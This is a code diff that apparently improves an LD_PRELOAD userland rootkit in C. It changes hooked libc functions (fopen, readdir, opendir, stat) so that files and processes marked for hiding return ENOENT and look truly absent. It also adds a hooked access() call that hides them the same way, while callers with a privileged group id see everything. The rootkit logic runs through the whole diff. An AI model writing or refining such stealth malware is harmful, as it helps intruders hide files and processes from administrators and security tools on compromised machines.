@@ -14,6 +14,7 @@
 #include <netinet/in.h>
 #include <pthread.h>
 #include <sys/ptrace.h>
+#include <errno.h>
 
 int good_gid() {
     gid_t gid = getgid();
@@ -102,10 +103,12 @@ FILE *fopen(const char *path, const char *mode) {
     }
 
     if (file_check(path) == 1) {
+        errno = ENOENT;
         return NULL;
     }
 
     if (pid_check(path) == 1) {
+        errno = ENOENT;
         return NULL;
     }
 
@@ -168,6 +171,7 @@ struct dirent *readdir(DIR *p) {
         return readdir(p);
     }
 
+    errno = 0;
     return dir;
 }
 
@@ -198,6 +202,7 @@ struct dirent64 *readdir64(DIR *p) {
         return readdir64(p);
     }
 
+    errno = 0;
     return dir;
 }
 
@@ -351,7 +356,8 @@ int openat(int dirfd, const char *path, int flags, ...) {
     return o_openat(dirfd, path, flags);
 }
 
-// openat64
+
+// open64
 
 int (*o_openat64)(int, const char *, int, ...);
 int open64(const char *path, int flags, ...) {
@@ -391,10 +397,12 @@ DIR *opendir(const char *name) {
     }
 
     if (file_check(name) == 1) {
+        errno = ENOENT;
         return NULL;
     }
 
     if (pid_check(name) == 1) {
+        errno = ENOENT;
         return NULL;
     }
 
@@ -416,6 +424,35 @@ int stat(const char *pathname, struct stat *statbuf) {
     }
 
     if (file_check(pathname) == 1) {
+        errno = ENOENT;
+        return -1;
+    }
+
+    if (pid_check(pathname) == 1) {
+        errno = ENOENT;
+        return -1;
+    }
+
+    return o_stat(pathname, statbuf);
+}
+
+// access
+
+int (*o_access)(const char *, int);
+int access(const char *pathname, int mode) {
+#ifdef VERBOSE
+    printf("access called\n");
+#endif
+
+    if(!o_access)
+        o_access = dlsym(RTLD_NEXT, "access");
+
+    if (good_gid() == 1) {
+        return o_access(pathname, mode);
+    }
+
+    if (file_check(pathname) == 1) {
+        errno = ENOENT;
         return -1;
     }
 
@@ -423,5 +460,5 @@ int stat(const char *pathname, struct stat *statbuf) {
         return -1;
     }
 
-    return o_stat(pathname, statbuf);
+    return o_access(pathname, mode);
 }
